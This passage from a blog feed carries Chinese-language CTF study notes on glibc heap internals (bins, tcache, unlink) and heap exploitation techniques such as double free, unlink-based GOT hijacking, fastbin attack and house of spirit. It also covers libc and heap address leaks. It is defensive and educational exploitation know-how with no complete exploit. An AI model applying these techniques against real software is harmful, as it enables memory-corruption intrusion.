data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvc3lzdGVtLzE3MTI2MS5odG1s\">https://www.freebuf.com/articles/system/171261.html</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0JyZWV6ZV9DQVQvYXJ0aWNsZS9kZXRhaWxzLzEwMzc4ODY5OA==\">https://blog.csdn.net/Breeze_CAT/article/details/103788698</span></p>\n<h3 id=\"tcache（thread-local-caching）机制\"><a href=\"#tcache（thread-local-caching）机制\" class=\"headerlink\" title=\"tcache（thread local caching）机制\"></a>tcache（thread local caching）机制</h3><ul>\n<li><code>tcache</code>属于一种缓存机制，它为每一个线程创建了一个缓存，从而实现了不加锁的堆块分配算法，起到了性能提升的作用。</li>\n<li>仅适用于glibc2.26以上的版本使用</li>\n</ul>\n<h3 id=\"Bin机制\"><a href=\"#Bin机制\" class=\"headerlink\" title=\"Bin机制\"></a>Bin机制</h3><ul>\n<li>ptmalloc 一共维护128个bin，使用数组存储链表头，</li>\n<li><strong>fast bin</strong>：fastbin是一些要被系统回收的较小的内存块，此类内存块使用一个<strong>单向链表</strong>进行存储，该bin中的所有chunk都不会被合并。内存分配时会先在fastbins中进行查找，随后才会在其他bin中进行查找。（chunksize &lt; maxsize时才会被放在fastbin中）采用先进先出标准进行管理。</li>\n<li><strong>small bin</strong>：专门存放size&lt;512的chunk，使用双向链表进行存储（也就是之前所说的拉链法存储），数组中的每个元素是chunk链的头，只有相同大小的bin能被存在一个链里，每个链之间相差8byte。共有62个循环双向链表。small bin与fast bin的某些大小是重合的，因此有些可以放入fastbin的块也可以在smallbin</li>\n<li><strong>large bin</strong>：需要对bin中的chunk按照大小进行排序。</li>\n<li><strong>unsorted bin</strong>：可以将其视为一个bin在回归其正确的所属bin之前的一个缓存，在释放一个不符合fast bin要求的chunk时会被先放入到unsorted bin中进行存储，同理，在进行chunk的切割后，剩余的某个部分是不合fast bin要求的则会将其放入unsorted bin中进行存储。与一般的bin不同之处在于，unsorted bin其本身只有一个。<ul>\n<li>当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。</li>\n<li>释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。</li>\n<li>fastchunk中的某些bin合并后大于fast bin的要求，那就先放入usorted bin等待后续的处理。</li>\n<li>unsorted bin在使用的过程中是FIFO的</li>\n</ul>\n</li>\n<li><strong>Top Chunk</strong>：Topchunk其实是在用户进行首次malloc时使用的内存，一部分给用户，一部分留给了Topchunk，当所有的bin都没有符合所需大小的时候，才会去动Top chunk，Top chunk的prevsize永远为1，否则前面的chunk就会被合并到Top Chunk中（也就是说链表中的前一个chunk始终不会被合并到top chunk中去），其实根据上面的过程不难发现，<strong>初始状态下的UNsorted chunk 就是 Top chunk</strong></li>\n<li>last reminder：其实就是经过malloc分配后切割出来的一块，这一块会放进unsorted bin中。</li>\n</ul>\n<h3 id=\"Bin运作流程\"><a href=\"#Bin运作流程\" class=\"headerlink\" title=\"Bin运作流程\"></a>Bin运作流程</h3><ul>\n<li>如果被用户释放的chunk大于max_fast，或者fast bins中的空闲chunk合并后，这些chunk首先会被放到unsorted bin队列中</li>\n<li>在进行malloc操作的时候，如果在fast bins中没有找到合适的chunk，则ptmalloc会先在unsorted bin中查找合适的空闲chunk，然后才查找bins。</li>\n<li>如果unsorted bin不能满足分配要求。malloc便会将unsorted bin中的chunk加入bins中。然后再从bins中继续进行查找和分配过程。</li>\n<li>unsorted bin可以看做是bins的一个缓冲区，增加它只是为了加快分配的速度。</li>\n<li>在size&gt;FASTBIM_CONNSOLIDATION_THRESHOLD,时(需要大chunk时)，ptmalloc会遍历fast bins中的chunk，将相邻的空闲chunk进行合并，并将合并后的chunk加入unsorted bin中，然后再将usorted bin里的chunk加入bins中。<br>Unsorted Bin</li>\n<li>空闲的chunk连入bin时,会将 P 设为 0 , 并检查前后chunk是否空闲,若空闲则合并后加入unsorted bins中</li>\n<li>当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。</li>\n<li>释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。</li>\n<li>当进行 malloc_consolidate 时，可能会把合并后的 chunk 放到 unsorted bin 中，如果不是和 top chunk 近邻的话</li>\n<li>分配过程：fastbin-&gt;unsorted bin-&gt;其他bins-&gt;切割top chunk</li>\n<li>回收过程：<ul>\n<li>在maped区域，直接回收即可</li>\n<li>在heap区域：首先检查当前堆块是否符合fastbin的要求，如果不符合就将其先放入到unsorted bin中等待后续的处理</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"各个bin的处理先后顺序\"><a href=\"#各个bin的处理先后顺序\" class=\"headerlink\" title=\"各个bin的处理先后顺序\"></a>各个bin的处理先后顺序</h3><ul>\n<li>fastbin 是 LIFO (后入先出)</li>\n<li>unsorted bin是 FIFO (先进先出)</li>\n<li>small bin 是 FIFO</li>\n<li>large bin 是 FIFO</li>\n<li>tcache 是 LIFO</li>\n<li>实际利用时只要知道fastbin为了加快速度学习了栈的机制</li>\n</ul>\n<h3 id=\"线程堆\"><a href=\"#线程堆\" class=\"headerlink\" title=\"线程堆\"></a>线程堆</h3><ul>\n<li>每个线程在创建之初是会先申请一大块堆，使用heap_info结构对其进行记录，所有的heap通过单链表进行连接。一个线程可以有多个堆（其实就是初始分配的不够用），由于线程只能使用mmap，后续的堆要使用pre指针将heap_info进行连接。</li>\n</ul>\n<h3 id=\"malloc-state-1\"><a href=\"#malloc-state-1\" class=\"headerlink\" title=\"malloc_state\"></a>malloc_state</h3><ul>\n<li>该结构用于管理堆，记录每个 arena 当前申请的内存的具体状态，比如说是否有空闲 chunk，有什么大小的空闲 chunk 等等。</li>\n<li>无论是 thread arena 还是 main arena，它们都只有一个 malloc state 结构。</li>\n</ul>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token keyword\">struct</span> <span class=\"token class-name\">malloc_state</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">/* Serialize access.  */</span>\n    <span class=\"token function\">__libc_lock_define</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">,</span> mutex<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">/* Flags (formerly in max_fast).  */</span>\n    <span class=\"token keyword\">int</span> flags<span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">/* Fastbins */</span>\n    mfastbinptr fastbinsY<span class=\"token punctuation\">[</span> NFASTBINS <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">/* Base of the topmost chunk -- not otherwise kept in a bin */</span>\n    mchunkptr top<span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">/* The remainder from the most recent split of a small request */</span>\n    mchunkptr last_remainder<span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">/* Normal bins packed as described above */</span>\n    mchunkptr bins<span class=\"token punctuation\">[</span> NBINS <span class=\"token operator\">*</span> <span class=\"token number\">2</span> <span class=\"token operator\">-</span> <span class=\"token number\">2</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">/* Bitmap of bins, help to speed up the process of determinating if a given bin is definitely empty.*/</span>\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> binmap<span class=\"token punctuation\">[</span> BINMAPSIZE <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">/* Linked list, points to the next arena */</span>\n    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">malloc_state</span> <span class=\"token operator\">*</span>next<span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">/* Linked list for free arenas.  Access to this field is serialized\n       by free_list_lock in arena.c.  */</span>\n    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">malloc_state</span> <span class=\"token operator\">*</span>next_free<span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">/* Number of threads attached to this arena.  0 if the arena is on\n       the free list.  Access to this field is serialized by\n       free_list_lock in arena.c.  */</span>\n    INTERNAL_SIZE_T attached_threads<span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">/* Memory allocated from the system in this arena.  */</span>\n    INTERNAL_SIZE_T system_mem<span class=\"token punctuation\">;</span>\n    INTERNAL_SIZE_T max_system_mem<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n<h2 id=\"堆管理函数\"><a href=\"#堆管理函数\" class=\"headerlink\" title=\"堆管理函数\"></a>堆管理函数</h2><h3 id=\"libc-malloc\"><a href=\"#libc-malloc\" class=\"headerlink\" title=\"libc_malloc\"></a>libc_malloc</h3><p>​\tmalloc函数的本质是libc_malloc, 该函数其实也是对_int_malloc函数做一个封装操作。</p>\n<p><strong>用户申请的字节一旦进入libc_malloc会转换为无符号整数</strong>，同时在源码中能看到其中包含一个对于malloc_hook函数指针的调用，是便于用于进行自定义的malloc函数的编写。</p>\n<h3 id=\"unlink\"><a href=\"#unlink\" class=\"headerlink\" title=\"unlink\"></a>unlink</h3><ul>\n<li>作用：将一个chunk从双向链表中取出来，其实就是解链操作，因此该函数的使用十分频繁。</li>\n<li>使用场景：<ul>\n<li><strong>malloc</strong><ul>\n<li>从恰好大小合适的 large bin 中获取 chunk。<ul>\n<li><strong>这里需要注意的是 fastbin 与 small bin 就没有使用 unlink，这就是为什么漏洞会经常出现在它们这里的原因。</strong></li>\n<li><strong>依次遍历处理 unsorted bin 时也没有使用 unlink</strong> 。</li>\n</ul>\n</li>\n<li>从比请求的 chunk 所在的large bin 中取 chunk。</li>\n</ul>\n</li>\n<li><strong>free</strong><ul>\n<li>后向合并，合并物理相邻低地址空闲 chunk。</li>\n<li>前向合并，合并物理相邻高地址空闲 chunk（除了 top chunk）。</li>\n</ul>\n</li>\n<li><strong>malloc_consolidate</strong>：用于合并的时候要把空闲块取出来先。<ul>\n<li>后向合并，合并物理相邻低地址空闲 chunk。</li>\n<li>前向合并，合并物理相邻高地址空闲 chunk（除了 top chunk）。</li>\n</ul>\n</li>\n<li><strong>realloc</strong><ul>\n<li>前向扩展，合并物理相邻高地址空闲 chunk（除了 top chunk）。</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token comment\">/* Take a chunk off a bin list */</span>\n<span class=\"token comment\">// unlink p</span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name function\">unlink</span><span class=\"token expression\"><span class=\"token punctuation\">(</span>AV<span class=\"token punctuation\">,</span> P<span class=\"token punctuation\">,</span> BK<span class=\"token punctuation\">,</span> FD<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>  </span><span class=\"token comment\">//这里FD是前面的chunk，BK是后面的chunk,传入的BK和FD是空指针          \\\n    // 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。</span></span>\n\t<span class=\"token comment\">// 这两个位置分别是下一个chunk的prevsize和他自己记录的chunksize大小</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">__builtin_expect</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chunksize</span><span class=\"token punctuation\">(</span>P<span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token function\">prev_size</span> <span class=\"token punctuation\">(</span><span class=\"token function\">next_chunk</span><span class=\"token punctuation\">(</span>P<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>      \\\n      <span class=\"token function\">malloc_printerr</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"corrupted size vs. prev_size\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>               \\\n    FD <span class=\"token operator\">=</span> P<span class=\"token operator\">-&gt;</span>fd<span class=\"token punctuation\">;</span>                                                                      \\\n    BK <span class=\"token operator\">=</span> P<span class=\"token operator\">-&gt;</span>bk<span class=\"token punctuation\">;</span>                                                                      \\\n    <span class=\"token comment\">// 此处才真正的取出FD和BK两个chunk块</span>\n    <span class=\"token comment\">// 防止攻击者简单篡改空闲的 chunk 的 fd 与 bk 来实现任意写的效果。</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">__builtin_expect</span> <span class=\"token punctuation\">(</span>FD<span class=\"token operator\">-&gt;</span>bk <span class=\"token operator\">!=</span> P <span class=\"token operator\">||</span> BK<span class=\"token operator\">-&gt;</span>fd <span class=\"token operator\">!=</span> P<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>                    \\ <span class=\"token comment\">// 看看取出的目标块是不是真正的目标</span>\n      <span class=\"token function\">malloc_printerr</span> <span class=\"token punctuation\">(</span>check_action<span class=\"token punctuation\">,</span> <span class=\"token string\">\"corrupted double-linked list\"</span><span class=\"token punctuation\">,</span> P<span class=\"token punctuation\">,</span> AV<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  \\\n    <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>                                                                      \\\n        FD<span class=\"token operator\">-&gt;</span>bk <span class=\"token operator\">=</span> BK<span class=\"token punctuation\">;</span>                                                              \\\n        BK<span class=\"token operator\">-&gt;</span>fd <span class=\"token operator\">=</span> FD<span class=\"token punctuation\">;</span>   <span class=\"token comment\">// 此处主要是将P排除在外，让前后块进行连接                 \\\n        // 下面主要考虑 P 对应的 nextsize 双向链表的修改</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">in_smallbin_range</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chunksize_nomask</span> <span class=\"token punctuation\">(</span>P<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>                              \\\n            <span class=\"token comment\">// 如果P-&gt;fd_nextsize为 NULL，表明 P 未插入到 nextsize 链表中。</span>\n            <span class=\"token comment\">// 那么其实也就没有必要对 nextsize 字段进行修改了。</span>\n            <span class=\"token comment\">// 这里没有去判断 bk_nextsize 字段，可能会出问题。</span>\n            <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">__builtin_expect</span> <span class=\"token punctuation\">(</span>P<span class=\"token operator\">-&gt;</span>fd_nextsize <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>                      \\\n            <span class=\"token comment\">// 类似于小的 chunk 的检查思路</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">__builtin_expect</span> <span class=\"token punctuation\">(</span>P<span class=\"token operator\">-&gt;</span>fd_nextsize<span class=\"token operator\">-&gt;</span>bk_nextsize <span class=\"token operator\">!=</span> P<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>              \\\n                <span class=\"token operator\">||</span> <span class=\"token function\">__builtin_expect</span> <span class=\"token punctuation\">(</span>P<span class=\"token operator\">-&gt;</span>bk_nextsize<span class=\"token operator\">-&gt;</span>fd_nextsize <span class=\"token operator\">!=</span> P<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>    \\\n              <span class=\"token function\">malloc_printerr</span> <span class=\"token punctuation\">(</span>check_action<span class=\"token punctuation\">,</span>                                      \\\n                               <span class=\"token string\">\"corrupted double-linked list (not small)\"</span><span class=\"token punctuation\">,</span>    \\\n                               P<span class=\"token punctuation\">,</span> AV<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>                                              \\\n            <span class=\"token comment\">// 这里说明 P 已经在 nextsize 链表中了。</span>\n            <span class=\"token comment\">// 如果 FD 没有在 nextsize 链表中</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>FD<span class=\"token operator\">-&gt;</span>fd_nextsize <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>                                      \\\n                <span class=\"token comment\">// 如果 nextsize 串起来的双链表只有 P 本身，那就直接拿走 P</span>\n                <span class=\"token comment\">// 令 FD 为 nextsize 串起来的</span>\n                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>P<span class=\"token operator\">-&gt;</span>fd_nextsize <span class=\"token operator\">==</span> P<span class=\"token punctuation\">)</span>                                      \\\n                  FD<span class=\"token operator\">-&gt;</span>fd_nextsize <span class=\"token operator\">=</span> FD<span class=\"token operator\">-&gt;</span>bk_nextsize <span class=\"token operator\">=</span> FD<span class=\"token punctuation\">;</span>                      \\\n                <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>                                                              \\\n                <span class=\"token comment\">// 否则我们需要将 FD 插入到 nextsize 形成的双链表中</span>\n                    FD<span class=\"token operator\">-&gt;</span>fd_nextsize <span class=\"token operator\">=</span> P<span class=\"token operator\">-&gt;</span>fd_nextsize<span class=\"token punctuation\">;</span>                              \\\n                    FD<span class=\"token operator\">-&gt;</span>bk_nextsize <span class=\"token operator\">=</span> P<span class=\"token operator\">-&gt;</span>bk_nextsize<span class=\"token punctuation\">;</span>                              \\\n                    P<span class=\"token operator\">-&gt;</span>fd_nextsize<span class=\"token operator\">-&gt;</span>bk_nextsize <span class=\"token operator\">=</span> FD<span class=\"token punctuation\">;</span>                              \\\n                    P<span class=\"token operator\">-&gt;</span>bk_nextsize<span class=\"token operator\">-&gt;</span>fd_nextsize <span class=\"token operator\">=</span> FD<span class=\"token punctuation\">;</span>                              \\\n                  <span class=\"token punctuation\">}</span>                                                              \\\n              <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>                                                              \\\n                <span class=\"token comment\">// 如果在的话，直接拿走即可</span>\n                P<span class=\"token operator\">-&gt;</span>fd_nextsize<span class=\"token operator\">-&gt;</span>bk_nextsize <span class=\"token operator\">=</span> P<span class=\"token operator\">-&gt;</span>bk_nextsize<span class=\"token punctuation\">;</span>                      \\\n                P<span class=\"token operator\">-&gt;</span>bk_nextsize<span class=\"token operator\">-&gt;</span>fd_nextsize <span class=\"token operator\">=</span> P<span class=\"token operator\">-&gt;</span>fd_nextsize<span class=\"token punctuation\">;</span>                      \\\n              <span class=\"token punctuation\">}</span>                                                                      \\\n          <span class=\"token punctuation\">}</span>                                                                      \\\n      <span class=\"token punctuation\">}</span>                                                                              \\\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<ul>\n<li>注意：以上操作有个Bug、就是其只是对P前后的内容进行了处理，也就是只对链进行了处理，但是并没有对P本身这个块进行任何的处理。也就是P-&gt;fd,和P-&gt;bk两个指针中还是存储着地址值的。因此可以利用这个地址进行libc地址的泄露</li>\n<li>泄露思路：<ul>\n<li>P 位于双向链表头部，bk 泄漏</li>\n<li>P 位于双向链表尾部，fd 泄漏</li>\n<li>双向链表只包含一个空闲 chunk 时，P 位于双向链表中，fd 和 bk 均可以泄漏（啥意思？双向链表的起始地址，及时libc的地址吗？？）</li>\n</ul>\n</li>\n<li>泄露堆地址<ul>\n<li>P 位于双向链表头部，fd 泄漏</li>\n<li>P 位于双向链表中，fd 和 bk 均可以泄漏</li>\n<li>P 位于双向链表尾部，bk 泄漏</li>\n</ul>\n</li>\n<li>注意：<ul>\n<li>这里的头部指的是 bin 的 fd 指向的 chunk，即双向链表中最新加入的 chunk。</li>\n<li>这里的尾部指的是 bin 的 bk 指向的 chunk，即双向链表中最先加入的 chunk。</li>\n<li><strong>堆的第一个 chunk 所记录的 prev_inuse 位默认为 1。</strong></li>\n</ul>\n</li>\n</ul>\n<h3 id=\"init-malloc函数\"><a href=\"#init-malloc函数\" class=\"headerlink\" title=\"_init_malloc函数\"></a>_init_malloc函数</h3><p>该函数是malloc申请内存的底层函数</p>\n<ol>\n<li>它根据用户申请的<strong>内存块大小</strong>以及<strong>相应大小 chunk 通常使用的频度</strong>（fastbin chunk, small chunk, large chunk），依次实现了不同的分配方法。</li>\n<li>它由小到大依次检查不同的 bin 中是否有相应的空闲块可以满足用户请求的内存。</li>\n<li>当所有的空闲 chunk 都无法满足时，它会考虑 top chunk。</li>\n<li>当 top chunk 也无法满足时，堆分配器才会进行内存块申请。</li>\n</ol>\n<ul>\n<li>注意一点，所有的数据进入malloc之后全部都会被转化为无符号整数。</li>\n<li>当 fast bin、small bin 中的 chunk 都不能满足用户请求 chunk 大小时，就会考虑是不是 large bin。但是，其实在 large bin 中并没有直接去扫描对应 bin 中的 chunk，而是先利用 malloc_consolidate（参见 malloc_state 相关函数） 函数处理 fast bin 中的 chunk，将有可能能够合并的 chunk 先进行合并后放到 unsorted bin 中，不能够合并的就直接放到 unsorted bin 中，然后再在下面的大循环中进行相应的处理。<strong>为什么不直接从相应的 bin 中取出 large chunk 呢？这是 ptmalloc 的机制，它会在分配 large chunk 之前对堆中碎片 chunk 进行合并，以便减少堆中的碎片。</strong></li>\n</ul>\n<h2 id=\"堆溢出常见攻击手段\"><a href=\"#堆溢出常见攻击手段\" class=\"headerlink\" title=\"堆溢出常见攻击手段\"></a>堆溢出常见攻击手段</h2><p><img data-src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202309172016077.png\" alt=\"image-20230625155220102\"></p>\n<h3 id=\"堆溢出\"><a href=\"#堆溢出\" class=\"headerlink\" title=\"堆溢出\"></a>堆溢出</h3><p>​\t堆溢出的本质可以类比栈溢出的内容，堆溢出的本质是从用户缓冲区向下溢出到下一个堆块中，如果溢出长度够长，甚至能够重写下一个堆块中的内容。</p>\n<h3 id=\"double-free\"><a href=\"#double-free\" class=\"headerlink\" title=\"double free\"></a>double free</h3><p>​\tdouble free漏洞的本质是将当前对应块的指针做二次的free操作。对同一个块进行两次free操作，则该块会被加入到bin链两次，那么在后续进行多次malloc时会出现指针相同的情况</p>\n<h3 id=\"unlink-1\"><a href=\"#unlink-1\" class=\"headerlink\" title=\"unlink\"></a>unlink</h3><ul>\n<li>unlink的作用是将free时，操作双向链表中相邻的两个free chunk进行合并操作。</li>\n<li>注意事项:unlink不发生在<em>fastbin和smallbin</em>中,所以fastbin和smallbin容易产生漏洞。fastbin使用单向链表进行存储</li>\n<li>unlink本身存在一些检查</li>\n</ul>\n<p>unlink首先检查当前内存空间中该块的相邻块是否空闲，并且检查当前的块大小和下一个块记录的prev_size大小是否相同，如果空闲则进行合并操作。</p>\n<p>unlink的代码中实现的操作就是将当前程序中的某个chunk从双向链表中取出来，下面的代码以当前要取出的块是p为例。</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\">FD <span class=\"token operator\">=</span> p<span class=\"token operator\">-&gt;</span>fd<span class=\"token punctuation\">;</span>\nBK <span class=\"token operator\">=</span> p<span class=\"token operator\">-&gt;</span>bk<span class=\"token punctuation\">;</span>\nFD<span class=\"token operator\">-&gt;</span>bk <span class=\"token operator\">=</span> BK<span class=\"token punctuation\">;</span>\nBK<span class=\"token operator\">-&gt;</span>fd <span class=\"token operator\">=</span> FD<span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// 其实就是传统的双向链表取元素的操作</span>\n<span class=\"token comment\">/*\n\t上述操作中，当前块的fd和bk是可以被伪造的。\n\t假设此刻将两个地址分别重写为got[free], 和shellcode地址\n\t执行前两条指令后。\n\tFD = got[free] - 12（32位机器）\n\tBK = shellcode  // 这里BK要加fd，所以不需要存储\n\t执行第三条指令，将got表中的地址写为shellcode地址，从而实现got表劫持\n\t但是这个方法在新版libc里没有用！！！\n*/</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>​\tunlink之前需要进行一些简单的检查，这个检查是可以欺骗的：</p>\n<p>​\tfd的偏移是3个机器位数，bk的偏移是4个机器位数。即在64位机器上，fd是8*3=24字节，bk是8*4=32字节；32位机器上，fd是4 *3 =12字节，bk是4*4=16字节。设伪空闲堆块的堆块头指针是p，那么需要检查：p-&gt;bk-&gt;fd==p &amp;&amp; p-&gt;fd-&gt;bk==p, 只需要保证满足 fd = &amp;p - 3*size(int); bk = &amp;p - 2*size(int) 即可。</p>\n<p>​\t<strong>也就是说</strong>：在新版的glibc中，使用另一种思路，依赖于一个UAF漏洞，对一个已经free的堆块进行修改。假设想要修改的内存是ptr，那么就修改这p中fd = &amp;ptr - 3*size(int); bk = &amp;ptr- 2*size(int) ，在检查的过程中BK-&gt;fd = FD-&gt;BK = ptr。 最终在执行完unlink操作后，ptr变为了ptr-0x18（其实也就是最后一条指令的作用），但是同样新版的unlink也会修改</p>\n<h4 id=\"例题-0CTF2015-freenote\"><a href=\"#例题-0CTF2015-freenote\" class=\"headerlink\" title=\"例题 0CTF2015 freenote\"></a>例题 0CTF2015 freenote</h4><p>​\t</p>\n<h3 id=\"fastbin-attack\"><a href=\"#fastbin-attack\" class=\"headerlink\" title=\"fastbin attack\"></a>fastbin attack</h3><h4 id=\"攻击原理\"><a href=\"#攻击原理\" class=\"headerlink\" title=\"攻击原理\"></a>攻击原理</h4><p>fastbin是一种简单的单向链表，用于存储大小小于等于0x80（默认情况下）的已经释放的堆块。Fastbin attack的基本原理是利用fastbin链表的机制，通过伪造堆块的头部，使得堆分配器将伪造的堆块地址返回给程序，从而控制被释放的堆块的指针。攻击者可以通过覆盖被释放的堆块的指针，实现任意地址写或者控制流劫持。</p>\n<h4 id=\"house-of-spirit\"><a href=\"#house-of-spirit\" class=\"headerlink\" title=\"house of spirit\"></a>house of spirit</h4><p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvODUzNTc=\">https://www.anquanke.com/post/id/85357</span></p>\n<ul>\n<li>house of sporit与double free存在相似之处，二者的区别free掉的块一个指向真正被malloc的过的内存，而另一个则是构造一个完全虚假的内存块，并且包含精心构造的chunk数据结构</li>\n<li></li>\n</ul>\n<h3 id=\"tcache-attack\"><a href=\"#tcache-attack\" class=\"headerlink\" title=\"tcache attack\"></a>tcache attack</h3><p>tcache本身是单向链表，并且一个线程对应一个tcache存在。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9maXJtaWFuYXkuZ2l0Ym9va3MuaW8vY3RmLWFsbC1pbi1vbmUvY29udGVudC9kb2MvNC4xNF9nbGliY190Y2FjaGUuaHRtbCNjdGYtJUU1JUFFJTlFJUU0JUJFJThC\">https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/4.14_glibc_tcache.html#ctf-%E5%AE%9E%E4%BE%8B</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly92MWNreWR4cC5naXRodWIuaW8vMjAxOS8wNi8zMC9UY2FjaGUtJUU2JTlDJUJBJUU1JTg4JUI2JUU1JTg4JTg2JUU2JTlFJTkwJUU1JThGJThBJUU1JTg4JUE5JUU3JTk0JUE4JUU2JTgwJTlEJUU4JUI3JUFGLw==\">https://v1ckydxp.github.io/2019/06/30/Tcache-%E6%9C%BA%E5%88%B6%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF/</span></p>\n<h2 id=\"堆利用例题\"><a href=\"#堆利用例题\" class=\"headerlink\" title=\"堆利用例题\"></a>堆利用例题</h2><p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvc3lzdGVtLzE3MTI2MS5odG1s\">https://www.freebuf.com/articles/system/171261.html</span></p>\n<h3 id=\"fastbin-dup-into-stack\"><a href=\"#fastbin-dup-into-stack\" class=\"headerlink\" title=\"fastbin_dup_into_stack\"></a>fastbin_dup_into_stack</h3>",
            "tags": [
                "HEAP PWN CTF"
            ]
        },
        {
            "id": "https://alazymechnaic.github.io/2023/05/05/bypass-aslr/",
            "url": "https://alazymechnaic.github.io/2023/05/05/bypass-aslr/",
            "title": "bypass-aslr",
            "date_published": "2023-05-05T02:29:48.000Z",
            "content_html": "",
            "tags": []
        },
        {
            "id": "https://alazymechnaic.github.io/2023/05/02/cfi-sec/",
            "url": "https://alazymechnaic.github.io/2023/05/02/cfi-sec/",
            "title": "CFI-Sec",
            "date_published": "2023-05-02T10:21:39.000Z",
